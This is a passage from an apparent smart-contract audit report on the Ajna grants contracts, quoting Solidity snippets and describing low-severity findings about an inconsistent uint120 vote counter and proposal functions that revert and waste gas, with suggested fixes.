not <code>Succeeded</code> or <code>Defeated</code>, to indicate that the proposal’s success state is to be determined when the time is in the challenge phase.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L505-L512\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L505-L512</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_standardProposalState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">)                                                     </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Executed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Active</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_standardFundingVoteSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">))                      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Succeeded</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\">                                                                       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L860-L865\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L860-L865</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_standardFundingVoteSucceeded</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_findProposalIndex</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_fundedProposalSlates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">fundedSlateHash</span><span class=\"mtk1\">]) != -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L300-L340\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L300-L340</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateSlate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTopSlate_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if slate of proposals is new top slate, update state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newTopSlate_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingSlate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_fundedProposalSlates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">newSlateHash</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// update list of proposals to fund</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">existingSlate</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// update hash to point to the new leading slate of proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundedSlateHash</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newSlateHash</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FundedSlateUpdated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">newSlateHash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"03-extraordinaryfundingproposalvotesreceived-in-extraordinaryfunding-contract-is-uint120-instead-of-uint128\" style=\"position:relative;\"><a href=\"#03-extraordinaryfundingproposalvotesreceived-in-extraordinaryfunding-contract-is-uint120-instead-of-uint128\" aria-label=\"03 extraordinaryfundingproposalvotesreceived in extraordinaryfunding contract is uint120 instead of uint128 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] <code>ExtraordinaryFundingProposal.votesReceived</code> IN <code>ExtraordinaryFunding</code> CONTRACT IS <code>uint120</code> INSTEAD OF <code>uint128</code></h2>\n<p>In the <code>StandardFunding</code> contract, <code>Proposal.votesReceived</code> is <code>uint128</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IStandardFunding.sol#L122-L129\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IStandardFunding.sol#L122-L129</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">;        </span><span class=\"mtk3\">// accumulator of screening votes received by a proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Yet, in the <code>ExtraordinaryFunding</code> contract, <code>ExtraordinaryFundingProposal.votesReceived</code> is <code>uint120</code>. Calling the <code>ExtraordinaryFunding.voteExtraordinary</code> function below by a user, who has the voting power being more than <code>type(uint120).max</code>, can revert, which causes such user to waste gas and fail to vote for the corresponding proposal. This degrades the user experience because such user, who is familiar with <code>Proposal.votesReceived</code> in the <code>StandardFunding</code> contract, could think that <code>ExtraordinaryFundingProposal.votesReceived</code> in the <code>ExtraordinaryFunding</code> contract would be <code>uint128</code> as well. To be more consistent and prevent disputes, please consider using <code>ExtraordinaryFundingProposal.votesReceived</code> as <code>uint128</code> instead of <code>uint120</code> in the <code>ExtraordinaryFunding</code> contract.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IExtraordinaryFunding.sol#L32-L39\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IExtraordinaryFunding.sol#L32-L39</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ExtraordinaryFundingProposal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint120</span><span class=\"mtk1\">  </span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">;   </span><span class=\"mtk3\">// Total votes received for this proposal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L131-L157\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L131-L157</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">voteExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check voting power at snapshot block and update proposal votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getVotesExtraordinary</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint120</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"04-calling-extraordinaryfundingproposeextraordinary-and-standardfundingproposestandard-functions-can-revert-and-waste-gas\" style=\"position:relative;\"><a href=\"#04-calling-extraordinaryfundingproposeextraordinary-and-standardfundingproposestandard-functions-can-revert-and-waste-gas\" aria-label=\"04 calling extraordinaryfundingproposeextraordinary and standardfundingproposestandard functions can revert and waste gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] CALLING <code>ExtraordinaryFunding.proposeExtraordinary</code> AND <code>StandardFunding.proposeStandard</code> FUNCTIONS CAN REVERT AND WASTE GAS</h2>\n<p>Calling the following <code>ExtraordinaryFunding.proposeExtraordinary</code> and <code>StandardFunding.proposeStandard</code> functions will call the <code>Funding._validateCallDatas</code> function below. Calling the <code>Funding._validateCallDatas</code> function will revert if <code>targets_[i] != ajnaTokenAddress || values_[i] != 0</code> is true. Hence, the <code>ExtraordinaryFunding.proposeExtraordinary</code> and <code>StandardFunding.proposeStandard</code> functions cannot be used to create proposals for calling addresses other than <code>ajnaTokenAddress</code> or sending ETH. When users are unaware of this, they could believe that proposals for general purposes can be created and executed; yet, because calling <code>ExtraordinaryFunding.proposeExtraordinary</code> and <code>StandardFunding.proposeStandard</code> functions with <code>targets_</code> being not <code>ajnaTokenAddress</code> or <code>values_</code> being positive revert, these users would waste their gas for nothing. To avoid confusion and disputes, please consider updating the <code>ExtraordinaryFunding.proposeExtraordinary</code> and <code>StandardFunding.proposeStandard</code> functions so <code>targets_</code> and <code>values_</code> would only be <code>ajnaTokenAddress</code> and 0 and not be specified by users.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L124\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L124</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">proposeExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlock_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">description_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_validateCallDatas</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L366-L404\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L366-L404</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">proposeStandard</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_validateCallDatas</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// check proposal parameters are valid and update tokensRequested</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L103-L141\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L103-L141</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateCallDatas</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check params have matching lengths</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || 